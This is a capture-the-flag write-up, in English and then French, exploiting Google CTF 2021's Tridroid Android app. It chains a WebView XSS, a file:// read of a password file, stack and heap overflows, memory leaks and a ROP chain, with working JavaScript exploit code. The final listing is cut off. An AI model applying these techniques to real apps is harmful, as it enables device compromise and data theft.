---
layout: post
author: [FPI, ABE]
title: "Tridroid - Google CTF 2021"
date: 2021-07-18
categories: [CTF, Pwn]
background_image: assets/Tridroid-Banner.jpg
title_color: "#ffffff"
---

Dans ce challenge, nous avons affaire à une application Android implémentant une Webview vulnérable aux XSS. 
Cette dernière possède également une librairie native exposant des fonctionnalités vulnérables à des overflow (stack, heap etc.)
Pour réaliser cet exploit, nous devons passer par la XSS pour appeler les fonctions vulnérables de la librairie native. 
Or, l'une d'entre elle est protégée par un mot de passe qu'il va falloir retrouver dynamiquement.

## Details

- Category : pwn
- Points : 363
- Solves : 10

### Description

Are you proficient enough to penetrate through the triangle of Android?

Note: the emulator does not have Internet access;

Note: You need to enable KVM on your machine to run the challenge locally; otherwise it will be super slow.

`nc tridroid.2021.ctfcompetition.com 1337`

The attachement was a zip file containing the following elements :

- app.apk: it's basically the Android Package; a compressed folder containing and regrouping all application setup files
- Dockerfile: file containing the commands to build the Docker image and create an emulator running Android x86_64 API level 30 (also known as Android 11)
- flag: local flag to run and test the exploit on our side before submitting it.
- run.sh: script used to build the Dockerfile and run some other mandatory commands to make the environment work properly
- server.py: python script used to create AVD (Android Virtual Device). This virtual device will be identical to Google's remote server, launch the app, set the flag and wait for our payload.

**Disclaimer** : This is not a challenge we managed to solve during the competition. However, while reading other teams' write up we thought it would be interesting to try to solve it on our own. Indeed, it involves several complex but nevertheless interesting techniques on binary exploitation and allows playing with Android real-world vulnerability. Have a good reading ;)

## Methodology

### Application analysis
Now we have all this stuff to work with, let's decompile the apk using apktool from the command line :

```
apktool d app.apk
```

Our apk is decompiled in a new folder called ***app*** (actually the original binary name without its extension). Listing its content below, we can see two interesting things :

```
total 36
drwxr-xr-x   7 kali kali 4096 Aug  2 16:32 .
drwxr-xr-x   3 kali kali 4096 Aug  2 16:32 ..
-rw-r--r--   1 kali kali  945 Aug  2 16:32 AndroidManifest.xml
-rw-r--r--   1 kali kali 2008 Aug  2 16:32 apktool.yml
drwxr-xr-x   2 kali kali 4096 Aug  2 16:32 assets
drwxr-xr-x   6 kali kali 4096 Aug  2 16:32 lib
drwxr-xr-x   3 kali kali 4096 Aug  2 16:32 original
drwxr-xr-x 129 kali kali 4096 Aug  2 16:32 res
drwxr-xr-x   5 kali kali 4096 Aug  2 16:32 smali
```

1. AndroidManifest.xml

This is the first file you have to analyse as it provides an overall overview of the inside components used by the application (Activities, Provider, Broadcast receiver and Services).

```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="com.google.ctf.pwn.tridroid" platformBuildVersionCode="30" platformBuildVersionName="11">
    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.tridroid">
        <activity android:name="com.google.ctf.pwn.tridroid.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>    
```
Here we can see the application only contains a MainActivity. This is the first activity that starts when we execute the app.

2. The _lib_ folder

You may not know it but Android applications can contain compiled, native libraries. These are often C or C++ code that developers wrote and compiled for a specific architecture. Android apps call them using the following syntax:

```java
static {
    System.loadLibrary("<library_name>");
}
```

Remaining files are not useful right now. thus, we can just delve into the source code by using [JADX](https://github.com/skylot/jadx) to see what the application really does.

### Source code analysis

#### OnCreate

First, the `OnCreate` method initializes the activity and specifies the layout resources used to define the user interface. We can see that components like _textView_, _editText_ and _webView_ will be used here.

```java
setContentView(R.layout.activity_main); //set UI view
//defining components
this.textView = (TextView) findViewById(R.id.textView);
this.editText = (EditText) findViewById(R.id.editText);
this.webView = (WebView) findViewById(R.id.webView);
generateSecretKey();
createPasswordFile();
```
Besides, two interesting functions are also being called (we're going to give more details later) :

- `generateSecretKey`
- `createPasswordFile`

An _editText_ listener is in charge of retrieving and updating data in real time before sending it to the webView through a _WebMessage_ object.

```java
this.editText.addTextChangedListener(new TextWatcher() {
    /* class com.google.ctf.pwn.tridroid.MainActivity.AnonymousClass1 */

    public void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) {}

    public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {}

    //real time update
    public void afterTextChanged(Editable editable) {
      //send input text to webView via WebMessage
        MainActivity.this.webView.postWebMessage(new WebMessage(MainActivity.this.editText.getText().toString()), Uri.parse("*"));
    }
});
```
A broadcast receiver is also used to set either :
- `com.google.ctf.pwn.tridroid.SET_FLAG` (which stores intent extra data as the flag)
- `com.google.ctf.pwn.tridroid.SET_NAME` (which sends user input data to the _editText_ listener)

```java
this.broadcastReceiver = new BroadcastReceiver() {
           /* class com.google.ctf.pwn.tridroid.MainActivity.AnonymousClass2 */

           public void onReceive(Context context, Intent intent) {
               if (intent.getAction().equals(MainActivity.SET_NAME_INTENT)) {
                   MainActivity.this.editText.setText(new String(Base64.getDecoder().decode(intent.getStringExtra("data")), StandardCharsets.UTF_8));
               } else if (intent.getAction().equals(MainActivity.SET_FLAG_INTENT)) {
                   MainActivity.this.flag = new String(Base64.getDecoder().decode(intent.getStringExtra("data").trim()), StandardCharsets.UTF_8).trim();
               }
           }
       };
```
The webView component properties are also defined in a way that all of them, including dangerous ones (local file access and JavaScript), are set to True.

```java
this.webView.getSettings().setJavaScriptEnabled(true);
this.webView.getSettings().setAllowFileAccess(true);
this.webView.getSettings().setAllowFileAccessFromFileURLs(true);
```

It's important to notice that a JavaScript interface called _bridge_ is created. It's used to bind JavaScript and client-side Android code. For instance (this is not the case here obviously), JavaScript code can call a method in Android Java code to display a _Dialog_ box instead of a simple and ugly alert (good to know !!!)

Finally, the webView loads an HTML file stored in the assets folder (_file://android_asset/index.html_) :

```html
<html>
<body>
<div>
</div>
<script>
    onmessage = function(event) {
        document.getElementsByTagName('div')[0].innerHTML = `Hi ${event.data}, how you doing?`;
    }
</script>
</body>
</html>
```

Sounds great to trigger an XSS don't you think ?

#### generateSecretKey
This function generates an AES key from an harcoded secret.

```java
private void generateSecretKey() {
    try {
        this.secretKey = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(new String(Base64.getDecoder().decode("VHJpYW5nbGUgb2YgQW5kcm9pZA=="), StandardCharsets.UTF_8).toCharArray(), new byte[32], 65536, 256)).getEncoded(), "AES");
    } catch (Exception e) {
        Log.e("TriDroid", "Generating AES key has failed ...", e);
    }
}
```

Because everything is hardcoded and no randomness is involved, this will always produce the same key.

#### createPasswordFile

This function creates a text file storing a 36-byte UUID generated using Java's `randomUUID`function.

```java
private void createPasswordFile() {
     try {
         FileOutputStream openFileOutput = getApplication().openFileOutput("password.txt", 0);
         try {
           //store 36 characters in password.txt file
             openFileOutput.write(UUID.randomUUID().toString().getBytes(StandardCharsets.UTF_8));
             if (openFileOutput != null) {
                 openFileOutput.close();
                 return;
             }
             return;
         } catch (Throwable th) {
             th.addSuppressed(th);
         }
         throw th;
     } catch (Exception e) {
         Log.e("TriDroid", "Generating password file has failed ...", e);
     }
 }
```

This UUID will be used as a password to protect the access to the next function.

#### manageStack

This function specifies the `@JavascriptInterface` decorator. It means that it's available to the JavaScript from the _bridge_ interface. Once called, it takes three arguments and verifies that the first is equal to the password stored in _password.txt_. After that, the Android native `manageStack` function is called with the last two arguments.

```java
@JavascriptInterface
public String manageStack(String str, String str2, String str3) {
    try {
        FileInputStream openFileInput = getApplication().openFileInput("password.txt");
        try {
          //verify first argument
            if (str.equals(new BufferedReader(new InputStreamReader(openFileInput)).readLine())) {
              //call native manageStack funtion
                String hex = hex(manageStack(str2, unhex(str3)));
                if (openFileInput != null) {
                    openFileInput.close();
                }
                return hex;
            } else if (openFileInput == null) {
                return "";
            } else {
                openFileInput.close();
                return "";
            }
        } catch (Throwable th) {
            th.addSuppressed(th);
        }
        throw th;
    } catch (Exception e) {
        Log.e("gCTF", "Reading password file has failed ...", e);
        return "";
    }
}
```

#### showFlag
This function writes the `AES/CBC/PKCS5PADDING` encrypted flag in the runtime logs.

```java
public void showFlag() {
    try {
        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
        instance.init(1, this.secretKey, new IvParameterSpec(new byte[16]));
        Log.d("TriDroid", "Flag: " + new String(Base64.getEncoder().encode(instance.doFinal(this.flag.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8));
    } catch (Exception e) {
        Log.e("TriDroid", "Showing flag has failed ...", e);
    }
}
```

The key used for the encryption is the one generated by `generateSecretKey` described earlier.

### Setting up the environment

We have built an AVD identical to the remote one and used the following script to launch our exploit and get the logs :

```bash
#!/bin/bash
adb shell am start -W -n com.google.ctf.pwn.tridroid/.MainActivity
# set a fake flag for local testing
adb shell am broadcast -a com.google.ctf.pwn.tridroid.SET_FLAG -e data Q1RGe1hZWn0K
adb shell am broadcast -a com.google.ctf.pwn.tridroid.SET_NAME -e data $(cat exploit.html | base64 | tr -d '\r\n')
# add chromium logs to show console.log() output
adb logcat -d -s chromium
adb logcat -d -s TriDroid
# clear the logs
adb logcat -c
```

We will write our exploit in a separate file called `exploit.html`.

After attempting to trigger an XSS, we realized it is not possible to execute javascript code directly. We can however execute code by abusing the `onerror` handler of an `img` tag :

```html
<span id="exp">
    // javascript code
</span>
<img src="a" onerror="eval(document.getElementById('exp').innerHTML);" />
```

In the rest of this write-up we will only focus on the javascript code of the exploit, but remember that all the code you will see has to be defined in the `span` tag shown above.

### Finding vulnerabilities in libtridroid

The libtridroid library implements the native `manageStack` function. We can find this function under the name `Java_com_google_ctf_pwn_tridroid_MainActivity_manageStack` in Ghidra. Here is the decompiled output after cleaning up :
![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/main.png)
Only the relevant part is shown here. We can see that this function can accept 4 commands :

- push
- pop
- modify
- top

Let's analyze them to see what they do and check if there is any exploitable vulnerability.

#### push

Avant d'appeler la fonction `push_element`, les données à empiler sont copiées dans un buffer temporaire. Ce dernier ne fait que 72 octets, mais nous contrôlons la taille à copier. Il y a donc un dépassement de tampon dans la pile (stack based buffer overflow).

La fonction `push_element` est la suivante :

![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/push.png)

Elle alloue un buffer de 24 octets sur le tas. Les 16 premiers octets sont mis à zéro et les 16 premiers octets des données à empiler y sont copiés. Les 8 derniers octets sont utilisés pour stocker un pointeur vers le `stack_top`.

Il s'agit clairement d'une liste chaînée. Le buffer de 24 octets représente un élément de la liste qui peut gérer 16 octets de données (dénoté par la structure personnalisée `element_t`). Le `stack_top` est simplement un pointeur vers le premier élément de la liste.

La fonction `push` ajoute simplement un élément au début de la liste.

#### pop

Cette fonction supprime simplement le premier élément de la liste :

![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/pop.png)


#### modify

Cette fonction permet de modifier le contenu du premier élément de la liste :

![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/modify.png)

Il y a deux vulnérabilités au sein de cette fonction.

La première se produit lorsque les nouvelles données sont copiées dans un buffer local de 40 octets sans vérifier sa longueur. Il en résulte un débordement du tampon de la pile.

La seconde se produit à la ligne suivante, lorsque ce tampon est copié dans le fichier de données du premier élément, à nouveau sans restreindre la taille des données à écrire. Cela entraîne un débordement de tampon dans le tas, car les éléments de liste sont stockés sur le tas. Demander à modifier le premier élément de la liste avec des données de plus de 16 octets écraserait le pointeur `next_elm` de cet élément, permettant potentiellement des primitives de lecture/écriture arbitraires.

#### top

Cette fonction récupère simplement le premier élément de la liste et le renvoie à l'application sous la forme d'un tableau Java ByteArray.

#### Attack plan

Avant d'établir un plan d'attaque, jetons un coup d'oeil aux protections activées sur la bibliothèque en utilisant `checksec` (outil fourni avec `pwntools`) :

```
$ checksec libc.so 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Toutes les protections sont activées. L'exploitation ne sera pas triviale.

Notre but est d'appeler la fonction `showFlag` depuis l'APK pour que le flag soit écrit dans les logs. Heureusement, la bibliothèque inclut la fonction `invokeJavaMethod`.

Cette fonction requiert 4 arguments :
1. Un pointeur vers l'objet `JNIEnv`.
2. Un pointeur sur l'objet `This`.
3. Un pointeur sur le nom de la fonction que nous voulons appeler : "showFlag".
4. Un pointeur sur la signature de la fonction que l'on veut appeler : "()V".

Cette signature signifie que la fonction ne prend aucun argument et retourne `Void`.

Pour arriver à ce stade, nous devons faire une ROP, en configurant les registres correctement. En abusant des 3 vulnérabilités identifiées précédemment, nous pouvons potentiellement construire notre chaîne ROP, mais nous avons besoin d'un mot de passe pour interagir avec la fonction `manageStack`. Ce mot de passe peut être récupéré en exploitant un XSS.

A cause de toutes ces protections, nous devrons aussi, d'une manière ou d'une autre, divulguer la valeur du canari pour exploiter les dépassements de tampon, divulguer l'adresse de base de `libtridroid` pour contourner PIE et divulguer l'adresse de base de la `libc` pour obtenir assez de gadgets pour notre ROP chain.

Le plan d'attaque complet est donc :

```
XXS -> leak password -> leak canary -> BOF -> leak libtridroid base address -> leak libc base address -> ROP -> invokeJavaMethod() -> showFlag()
```

### Récupération du mot de passe

Nous pouvons utiliser une XSS pour divulguer le mot de passe, mais nous devons d'abord savoir où il est stocké sur l'appareil. Pour cela, nous avons utilisé ADB et ouvert un shell sur l'émulateur. 

```
$ adb root
restarting adbd as root
$ adb shell
generic_x86_64_arm64:/ # cd /data/data/com.google.ctf.pwn.tridroid/files
generic_x86_64_arm64:/data/data/com.google.ctf.pwn.tridroid/files # ls
password.txt
generic_x86_64_arm64:/data/data/com.google.ctf.pwn.tridroid/files # cat password.txt
acec55ba-0f8e-4cff-82c9-5aee97c5bf54
```

Maintenant que nous avons le chemin complet du fichier de mot de passe et parce que la vue web a les droits d'accès sur le fichier, nous pouvons ouvrir une URL commençant par `file://` pour lire son contenu :

```javascript
const pwd = "/data/data/com.google.ctf.pwn.tridroid/files/password.txt";
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "file://"+pwd, false); // false for synchronous request
xmlHttp.send();
password = xmlHttp.responseText;
alert("password : "+password);
```

![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/alert_pwd.png)

Ca marche !
Les alertes sont très visuelles, mais sont encombrantes car nous devons cliquer dessus pour les faire disparaître. C'est pourquoi nous avons décidé d'utiliser `console.log()` à partir de maintenant. Le résultat devrait apparaître dans la sortie logcat de chrome :

```javascript
console.log("password : "+password);
```

En relançant l'exploit, la sortie dans les logs s'affiche comme prévu :

```
08-01 14:51:21.812  8690  8690 I chromium: [INFO:CONSOLE(8)] "password : acec55ba-0f8e-4cff-82c9-5aee97c5bf54", source:  (8)
```

En ayant le mot de passe, nous pouvons interagir avec la fonction `manageStack`. Comme un bridge a été enregistré, nous pouvons y accéder directement depuis le Javascript. Pour des raisons de commodité, nous avons décidé de faire des petits wrappers autour de cette fonction :

```javascript
function push(data) {
    // interface bridge
    return bridge.manageStack(password, "push", data);
}

function pop() {
    // interface bridge
    return bridge.manageStack(password, "pop", '');
}

function top() {
    // interface bridge
    return bridge.manageStack(password, "top", '');
}

function modify(data) {
    // interface bridge
    return bridge.manageStack(password, "modify", data);
}
```

Les données d'entrée doivent être spécifiées en hexadécimal. La sortie l'est également.

Nous pouvons le tester en empilant une valeur sur la pile et en la récupérant avec `top` :

```javascript
push("41424344")
console.log(top())
```

Cela donne :

```
08-01 15:01:04.401  8690  8690 I chromium: [INFO:CONSOLE(31)] "41424344", source:  (31)
```

### Divulguation du canari et de l'adresse de base de la librairie libtridroid

Nous pouvons abuser du fait que le `modify_element` n'ajoute pas un octet NULL à la fin de nos données pour divulguer le contenu de la pile.

![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/modify.png)

Comme le buffer temporaire n'est pas écrasé par un zéro après avoir été alloué, nous avons accès au contenu de la pile.

Après débogage avec GDB, nous avons observé que 8 octets après le début de ce buffer, une adresse de retour est toujours présente. La divulguer nous permettrait de contourner PIE.

Le canari est situé juste après les 40 octets du même buffer. Une chose importante à noter est que le canari ne commence pas par un octet NULL, contrairement à l'environnement Linux classique. Il s'agit d'une fonctionnalité de sécurité, qui vise à protéger contre ce type de fuite d'informations. Il est étrange que sur Android les canaris n'aient pas cette fonctionnalité de sécurité.

Afin de divulguer l'adresse de retour, nous pouvons appeler `modify` avec seulement 8 octets de nouvelles données et appeler `top` pour déclencher la fuite. Nous pouvons réaliser la même chose pour le canari en utilisant 40 octets de données :

```javascript
// initialize the stack top
push("41414141")
push("41414141")
push("41414141")

// leak return address
// return address is located in the stack at offset 8
modify("4141414141414141");
// skip 16 first bytes (4141...)
leak = top().substring(16);
console.log("Return address : "+leak);

// leak canary
// canary is at the end of the 40 bytes buffer
modify("41414141414141414141414141414141414141414141414141414141414141414141414141424242");
// skip 40 first bytes (4141...)
leak = top().substring(80);
canary = leak.substring(0, 16);
console.log("Canary : "+canary);
```

Which gives :

```
08-02 21:15:14.483 22159 22159 I chromium: [INFO:CONSOLE(42)] "Return address : ff9601d15f78", source:  (42)
08-02 21:15:14.489 22159 22159 I chromium: [INFO:CONSOLE(51)] "Canary : f39bbcd81de1a225", source:  (51)
```

En utilisant notre session de débogage avec GDB, nous constatons que l'adresse de retour est à l'offset `0x16FF` de la base de libtridroid. En soustrayant cet offset de l'adresse de retour, on obtient l'adresse de base.

Nous avons écrit de petites fonctions d'aide pour "packer" et "depacker" les adresses en little endian :

```javascript
function unpack64(data) {
    return parseInt(data.match(/../g).reverse().join(''), 16);
}

function pack64(data) {
    return data.toString(16).match(/../g).reverse().join('').padEnd(16, '0');
}
```

En les utilisant, nous pouvons divulguer l'adresse de base :

```javascript
base_addr = unpack64(leak) - 0x16FF;
console.log("Base address : "+base_addr.toString(16));
```

Ceci fournit le résultat suivant :

```
08-02 21:33:24.962 22159 22159 I chromium: [INFO:CONSOLE(50)] "Base address : 785fd1018000", source:  (50)
```

Nous pouvons confirmer que l'adresse est bien valide à partir de notre shell ADB :

```
generic_x86_64_arm64:/ # grep "tridroid" /proc/$(pidof com.google.ctf.pwn.tridroid)/maps | grep "r-x" | grep base.apk 
785fd1018000-785fd101a000 r-xp 003a1000 fd:05 40963                      /data/app/~~8HrbOax9i97fF6BJzSPA0Q==/com.google.ctf.pwn.tridroid-2Omui46_qGvtYZn0eUP3ZQ==/base.apk
```

Ayant l'adresse de base, nous pouvons calculer l'adresse de `invokeJavaMethod` car nous savons grâce à Ghidra qu'elle est située à l'offset `0xFA0` :

```javascript
invoke_addr = base_addr + 0xFA0;
console.log("invokeJavaMethod address : "+invoke_addr.toString(16));
```

### Obtenir des primitives de lecture/écriture arbitraires

Nous pouvons abuser des vulnérabilités identifiées dans `modify_element` pour tirer parti d'une lecture et d'une écriture arbitraires.

Une lecture arbitraire peut être obtenue en écrasant le pointeur `next_elm` du premier élément de la liste, avec l'adresse souhaitée. L'appel de `pop` modifiera ensuite `stack_top` pour qu'il pointe sur cette adresse, supprimant alors l'élément modifié. L'appel de `top` affichera les données situées à `stack_top`, qui est maintenant l'adresse que nous contrôlons.

L'écriture arbitraire s'obtient de la même manière. D'abord, nous devons modifier `stack_top` pour qu'il pointe sur l'adresse où nous voulons écrire, en utilisant les mêmes étapes que précédemment. Maintenant nous pouvons appeler `modify` une fois de plus pour écrire des données arbitraires à `stack_top`, qui est notre adresse souhaitée :

```javascript
function read(addr) {
    // push something because we pop after
    push("41")
    // 16*"41" + pointer overwrite
    modify("41414141414141414141414141414141"+pack64(addr));
    pop();
    return top();
}

function write(addr, data) {
    // push something because we pop after
    push("41")
    // 16*"41" + pointer overwrite
    modify("41414141414141414141414141414141"+pack64(addr));
    pop();
    modify(data)
}
```

### Divulgation de l'adresse de la libc

Une technique courante pour divulguer l'adresse de base de la libc lors de primitives de lecture arbitraires est de divulguer une adresse de la GOT (Global Offset Table). Nous devons choisir une fonction dont nous savons qu'elle a déjà été utilisée avant de la lire.

Nous avons décidé de divulguer l'adresse de `malloc`. Son offset dans libtridroid est `0x2F70`. Depuis notre shell ADB, nous pouvons voir à quel offset `malloc` est défini dans la libc de l'émulateur :

```
generic_x86_64_arm64:/ # readelf -s /system/lib64/libc.so | grep " malloc$"                                                                                                 
   801: 0000000000043410    79 FUNC    GLOBAL DEFAULT   14 malloc
  1658: 0000000000043410    79 FUNC    GLOBAL DEFAULT   14 malloc
```

Le décalage est de `0x43410`. En le soustrayant à l'adresse divulguée, on obtient l'adresse de base de la libc :

```javascript
// leak malloc address
malloc = unpack64(read(base_addr + 0x2F70))
// compute libc base
libc_base = malloc - 0x43410
console.log("Libc base address : "+libc_base.toString(16));
```

Cela donne :

```
08-03 20:10:33.389 23878 23878 I chromium: [INFO:CONSOLE(86)] "Libc base address : 7862bccd2000", source:  (86)
```

 ### Divulgation des objets JNIEnv and This

Nous avons vu que pour appeler la fonction `invokeJavaMethod`, nous avons besoin d'un pointeur sur l'objet `JNIEnv` et d'un pointeur sur l'objet `This`. Nous pouvons trouver des références à ces deux objets au début de la fonction `Java_com_google_ctf_pwn_tridroid_MainActivity_manageStack` :

![](/assets/posts/2021-07-18-Tridroid-Google-CTF-2021/envthis.png)

Nous voyons qu'ils sont stockés sur la pile à `RBP-0x60` et `RBP-0x68` respectivement (Ghidra ajoute 8 aux offsets de la pile car il commence à l'adresse de retour, IDA ne le fait pas).

Il s'avère que nous pouvons facilement divulguer la valeur de `RBP` car elle est stockée juste après le canari que nous avons divulgué plus tôt :

```javascript
// leak RBP
// RBP is at the end of the 40 bytes buffer, after the canary
modify("41414141414141414141414141414141414141414141414141414141414141414141414141424242"+canary);
// skip 48 first bytes (4141...)
leak = top().substring(96);
RBP = unpack64(leak);
console.log("RBP : "+RBP.toString(16));
```

Cela donne :

```
08-03 20:37:57.854  9143  9143 I chromium: [INFO:CONSOLE(99)] "RBP : 785fce295c30", source:  (99)
```

Maintenant nous pouvons divulguer les pointeurs vers `JNIEnv` et `This` en utilisant notre primitive de lecture :

```javascript
// get jniEnv and this
JNI_env = unpack64(read(RBP-0x60)); // vu dans IDA
this_ptr = unpack64(read(RBP-0x68)); // vu dans IDA
console.log("JNI_env : "+JNI_env.toString(16));
console.log("this_ptr : "+this_ptr.toString(16));
```

Ceci fournit le résultat suivant :

```
08-03 20:40:08.152  9143  9143 I chromium: [INFO:CONSOLE(104)] "JNI_env : 7860e9512af0", source:  (104)
08-03 20:40:08.153  9143  9143 I chromium: [INFO:CONSOLE(105)] "this_ptr : 785fce295c54", source:  (105)
```

### Positionner les derniers arguments

Les dernières choses dont nous avons besoin sont :

1. Un pointeur sur le nom de la fonction que nous voulons appeler : "showFlag".
2. Un pointeur sur la signature de la fonction que nous voulons appeler : "()V".

Puisque de telles chaînes ne sont pas définies dans le binaire, nous devrons les écrire nous-mêmes quelque part. Pour cela, nous allons utiliser notre primitive d'écriture, mais nous devons d'abord trouver une région de mémoire inscriptible suffisamment grande.

La `.bss` de libtridroid aurait été un bon choix mais elle est malheureusement trop petite. Nous avons donc décidé de regarder la `.bss` de la libc à la place. Cette fois-ci, elle est suffisamment grande pour que nous choisissions des adresses arbitraires en son sein : `0xD9510` et `0xD9530`.

A `0xD9510` nous allons écrire `"()V\x00"` et à `0xD9530` `"showFlag\x00"` :

```javascript
// write "showFlag" in libc
write(libc_base + 0xD9530, '73686F77466C616700');
// write "()V" in libc
write(libc_base + 0xD9510, '28295600');
```

### Construction de la ROP chain

Maintenant que nous avons tout ce qui est nécessaire pour construire la ROP chain, il ne nous reste plus qu'à trouver des gadgets.

D'après les conventions d'appel, les 4 premiers agruments sont stockés dans `RDI`, `RSI`, `RDX` et `RCX` respectivement.

Pour cela, nous avons utilisé [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) :

```
ROPgadget --binary libc.so > gadgets.txt
```

Heureusement, il existe des gadgets simples pour configurer nos registres :

```
$ grep ": pop rdi ; ret$" gadgets.txt 
0x0000000000042c92 : pop rdi ; ret
$ grep ": pop rsi ; ret$" gadgets.txt 
0x0000000000042d38 : pop rsi ; ret
$ grep ": pop rdx ; ret$" gadgets.txt 
0x0000000000046175 : pop rdx ; ret
$ grep ": pop rcx ; ret$" gadgets.txt 
0x0000000000042e58 : pop rcx ; ret
```

La ROP chain finale est la suivante :

```javascript
// 0x0000000000042e58 : pop rcx ; ret
pop_rcx = libc_base + 0x42e58
// 0x0000000000046175 : pop rdx ; ret
pop_rdx = libc_base + 0x46175
// 0x0000000000042c92 : pop rdi ; ret
pop_rdi = libc_base + 0x42c92
// 0x0000000000042d38 : pop rsi ; ret
pop_rsi = libc_base + 0x42d38
// 0x0000000000042af0 : ret
ret = libc_base + 0x42af0

rop = pack64(pop_rcx)
rop += pack64(libc_base + 0xD9510) // ()V
rop += pack64(pop_rdx)
rop += pack64(libc_base + 0xD9530) // showFlag
rop += pack64(pop_rsi)
rop += pack64(this_ptr)
rop += pack64(pop_rdi)
rop += pack64(JNI_env)
rop += pack64(ret) // for stack alignment
rop += pack64(invoke_addr)
```

Pour déclencher la ROP chain, il suffit d'écraser l'adresse de retour de la fonction `modify_element` :

```javascript
// overwrite RIP, after canary + EBP
modify("41414141414141414141414141414141414141414141414141414141414141414141414141414141"+canary+"4242424242424242"+rop);
```

En testant le payload final localement on constate que le faux flag chiffré est bien écrit dans les logs :

```
08-03 21:10:12.950 11858 11858 I chromium: [INFO:CONSOLE(8)] "password : 80965b49-ba84-4340-ab52-26bce809c2a1", source:  (8)
08-03 21:10:13.017 11858 11858 I chromium: [INFO:CONSOLE(67)] "Base address : 785fd1066000", source:  (67)
08-03 21:10:13.031 11858 11858 I chromium: [INFO:CONSOLE(76)] "Canary : f39bbcd81de1a225", source:  (76)
08-03 21:10:13.031 11858 11858 I chromium: [INFO:CONSOLE(80)] "invokeJavaMethod address : 785fd1066fa0", source:  (80)
08-03 21:10:13.050 11858 11858 I chromium: [INFO:CONSOLE(86)] "Libc base address : 7862bccd2000", source:  (86)
08-03 21:10:13.129 11858 11858 I chromium: [INFO:CONSOLE(100)] "RBP : 785fce154c30", source:  (100)
08-03 21:10:13.193 11858 11858 I chromium: [INFO:CONSOLE(110)] "JNI_env : 7860e95135f0", source:  (110)
08-03 21:10:13.200 11858 11858 I chromium: [INFO:CONSOLE(111)] "this_ptr : 785fce154c54", source:  (111)
...
08-03 21:10:13.201 11858 11954 D TriDroid: Flag: 66McrCEanCiGETTs3N/lOw==
```

### Obtenir le vrai flag

L'exploit complet est donné ci-dessous :

```javascript
<span id="exp">
    const pwd = "/data/data/com.google.ctf.pwn.tridroid/files/password.txt";

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "file://"+pwd, false); // false for synchronous request
    xmlHttp.send();
    password = xmlHttp.responseText;
    console.log("password : "+password);

    function push(data) {
        // interface bridge
        return bridge.manageStack(password, "push", data);
    }

    function pop() {
        // interface bridge
        return bridge.manageStack(password, "pop", '');
    }

    function top() {
        // interface bridge
        return bridge.manageStack(password, "top", '');
    }

    function modify(data) {
        // interface bridge
        return bridge.manageStack(password, "modify", data);
    }

    function unpack64(data) {
        return parseInt(data.match(/../g).reverse().join(''), 16);
    }

    function pack64(data) {
        return data.toString(16).match(/../g).reverse().join('').padEnd(16, '0');
    }

    function read(addr) {
        // push something because we pop after
        push("41")
        // 16*"41" + pointer overwrite
        modify("41414141414141414141414141414141"+pack64(addr));
        pop();
        return top();
    }

    function write(addr, data) {
        // push something because we pop after
        push("41")
        // 16*"41" + pointer overwrite
        modify("41414141414141414141414141414141"+pack64(addr));
        pop();
        modify(data)
    }

    // initialize the stack top
    push("41414141")
    push("41414141")
    push("41414141")

    // leak base address
    // base address is located in the stack at offset 8 but is itself offseted by 0x16FF
    modify("4141414141414141");
    // skip 16 first bytes (4141...)
    leak = top().substring(16);
    base_addr = unpack64(leak) - 0x16FF;
    console.log("Base address : "+base_addr.toString(16));

    // leak canary
    // canary is at the end of the 40 bytes buffer
    modify("41414141414141414141414141414141414141414141414141414141414141414141414141424242");
    // skip 40 first bytes (4141...)
    leak = top().substring(80);
    // javascript gives incorrect results if we parse the canary as an Int
    canary = leak.substring(0, 16);
    console.log("Canary : "+canary);

    // compute invokeJavaMethod address
    invoke_addr = base_addr + 0xFA0;
    console.log("invokeJavaMethod address : "+invoke_addr.toString(16));

    // leak malloc address
    malloc = unpack64(read(base_addr + 0x2F70))
    // compute libc base
    libc_base = malloc - 0x43410
    console.log("Libc base address : "+libc_base.toString(16));

    // add stuff on the stack otherwise things randomly break afterwards
    push("41414141")
    push("41414141")
    push("41414142")


    // leak RBP
    // RBP is at the end of the 40 bytes buffer, after the canary
    modify("41414141414141414141414141414141414141414141414141414141414141414141414141424242"+canary);
    // skip 48 first bytes (4141...)
    leak = top().substring(96);
    RBP = unpack64(leak);
    console.log("RBP : "+RBP.toString(16));

    // write "showFlag" in libc
    write(libc_base + 0xD9530, '73686F77466C616700');
    // write "()V" in libc
    write(libc_base + 0xD9510, '28295600');

    // get jniEnv and this
    JNI_env = unpack64(read(RBP-0x60)); // vu dans IDA
    this_ptr = unpack64(read(RBP-0x68)); // vu dans IDA
    console.log("JNI_env : "+JNI_env.toString(16));
    console.log("this_ptr : "+this_ptr.toString(16));


    // gadgets found using ROPGadget
    // 0x0000000000042e58 : pop rcx ; ret
    pop_rcx = libc_base + 0x42e58
    // 0x0000000000046175 : pop rdx ; ret
    pop_rdx = libc_base + 0x46175
    // 0x0000000000042c92 : pop rdi ; ret
    pop_rdi = libc_base + 0x42c92
    // 0x0000000000042d38 : pop rsi ; ret
    pop_rsi = libc_base + 0x42d38
